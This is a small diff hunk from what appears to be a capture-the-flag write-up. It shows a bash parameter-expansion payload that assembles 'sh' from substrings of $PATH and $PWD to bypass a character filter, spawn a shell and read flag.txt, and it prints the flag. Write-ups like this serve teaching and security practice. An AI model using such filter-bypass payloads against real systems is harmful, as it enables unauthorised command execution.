@@ -40,7 +40,7 @@ but we can generate length of string  with ${#VAR}
 
 ## \o/ Problem solved 
 
-${PATH:${#AB}:${#A}}${PWD:${#A}:${#A}} <== executes sh 
+${PATH:${#AB}:${#A}}${PWD:${#A}:${#A}} <== executes sh <br>
 then cat flag.txt
 Flag{B4sh_subst1tut1on_is_gud!}
 
